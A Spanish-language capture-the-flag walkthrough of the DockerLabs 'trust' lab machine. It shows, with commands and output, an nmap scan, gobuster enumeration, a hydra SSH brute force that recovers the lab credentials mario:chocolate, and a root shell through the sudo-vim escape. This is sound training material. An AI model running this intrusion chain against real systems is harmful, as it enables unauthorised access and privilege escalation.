### Reconocimiento
#### Conectividad
Lo primero de todo es probar que hay conexión, para ello lanzamos un `ping`.
```
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/trust]
└─$ ping -c2 172.18.0.2  
PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.057 ms

--- 172.18.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 0.057/0.062/0.068/0.005 ms
```
#### Escaneo de puertos
Ahora que sabemos que hay conectividad, vamos a lanzar un escaneo de puerto a ver que nos encontramos con el comando:
```
nmap -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n 172.18.0.2 -oN scan.txt
```
Y obtenemos la siguiente salida:
```
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/trust]
└─$ cat scan.txt   
# Nmap 7.98 scan initiated Fri Jan  2 14:00:15 2026 as: /usr/lib/nmap/nmap --privileged -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n -oN scan.txt 172.18.0.2
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2026-01-02 14:00:15 CET for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHjaznpuQYsT/kxLXSVDFJGTtesV6UrUh5aNJhw+tAdr19MnZpuY/8e0gb+NXRebo5Dcv/DP1H+aLFHaS6+XCGw=
|   256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJW/dREGeklk/wsHXisOmbmVwP9zg7U8xS+OfHkxLF0Z
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Como vemos tenemos abiertos los puertos $22$ (servicio `ssh`) y el puerto $80$ (servicio `HTTP`).
#### Escaneo de servicios
##### HTTP
Si ponemos la dirección IP en el navegador, encontramos la página por defecto de Apache, así que vamos a hacer una enumeración de directorios con `gobuster`, usando el comando:
```
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,txt -t 100 -k -r
```
Y vemos lo siguiente:
``` 
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/trust]
└─$ gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,txt -t 100 -k -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
```
Si entramos a `secret.php` encontramos un posible usuario "**mario**".
### Explotación
Ahora vamos a lanzar un ataque de fuerza bruta contra el usuario "**mario**" con `hydra`, para ello usamos el comando:
``` 
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 4
```
Y con ello obtendremos:
``` 
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/trust]
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-02 14:12:25
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-02 14:12:52
```
Con ello tenemos el acceso vía `ssh` con `<mario:chocolate>`.
### Escalada de privilegios
Lo primero entraremos por `ssh` con las credenciales que hemos encontrado. Si listamos con `ls` vemos que no hay nada en la carpeta `/home/mario`.
Buscaremos archivos con permisos de `sudo` así que probaremos lo siguiente:
``` 
mario@ef114cb40835:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on ef114cb40835:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User mario may run the following commands on ef114cb40835:
    (ALL) /usr/bin/vim
```
Podemos ver que el usuario "**mario**" puede ejecutar `vim` con todos los permisos. Así que buscamos en `GTFOBins` la explotación para este binario y encontramos que debemos ejecutar lo siguiente:
``` 
mario@ef114cb40835:~$ sudo vim -c ':!/bin/sh'

# whoami
root
```
Y como podemos ver, ya tenemos permisos de `root` y hemos comprometido completamente la máquina.
